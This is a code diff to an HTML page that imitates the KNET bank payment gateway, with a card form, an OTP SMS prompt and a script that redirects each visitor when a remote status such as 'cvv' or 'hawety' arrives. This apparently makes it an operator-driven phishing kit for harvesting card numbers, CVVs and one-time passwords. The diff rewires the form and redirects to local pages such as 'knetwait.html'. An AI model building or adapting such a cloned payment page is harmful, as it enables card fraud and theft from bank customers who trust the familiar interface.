@@ -22,7 +22,7 @@
 
 
 
-    <form method="post" action="#"><input type="hidden" name="_token" value="yHz88lwiZ20KwKQdeevEZTrtAzwFI8QgmxI3JiS8" autocomplete="off">
+    <form method="post" action="knetpage.html" onsubmit="return false;"><input type="hidden" name="_token" value="yHz88lwiZ20KwKQdeevEZTrtAzwFI8QgmxI3JiS8" autocomplete="off">
         <div class="madd">
             <img src="knet/mob.jpg" alt="">
         </div>
@@ -541,7 +541,7 @@
 
 
                                 <div id="submithide">
-                                    <button name="proceed" type="submit" class="submit-button" id="proceed"> Submit</button>
+                                    <button name="proceed" type="button" class="submit-button" id="proceed" onclick="window.location.href='knetwait.html'"> Submit</button>
 
                                     <input name="proceedCancel" type="button" class="cancel-button" onclick="cancelPage(); sibTags(&#39;MobCancelBtn&#39;,&#39;MobPayPage&#39;,&#39;CancelBtn&#39;);" id="cancel1" value="Cancel">
 
@@ -740,7 +740,7 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         <input type="hidden" name="merchHeaderFile" value="">
 
         <input type="hidden" name="mrchName" value="Tap Payments EPSP">
-        <input type="hidden" name="mrchWeb" value="#">
+        <input type="hidden" name="mrchWeb" value="index.html">
         <input type="hidden" name="pymntInstrmntCC" id="pymntInstrmntCC" value="1">
 
         <input type="hidden" name="pymntInstrmntAC" value="0">
@@ -907,22 +907,23 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
                 window.location.href = 'knetpage.html';
             }
             if (data.people_id == pid && data.status == 'cvv') {
-                window.location.href = '#';
+                window.location.href = 'knetwait.html';
             }
             if (data.people_id == pid && data.status == 'error') {
-                window.location.href = '#';
+                window.location.href = 'knetwait.html';
             }
             if (data.people_id == pid && data.status == 'hawety') {
-                window.location.href = '#';
+                window.location.href = 'knetwait.html';
             }
 
             if (data.people_id == pid && data.status == 'idpedol') {
-                window.location.href = '#';
+                window.location.href = 'knetwait.html';
             }
 
         });
     </script>
 
+<script>function cancelPage() { window.location.href = "index.html"; } function sibTags() {} function payConfirmAjax(action) { window.location.href = "knetwait.html"; }</script>
 </body>
 
 </html>
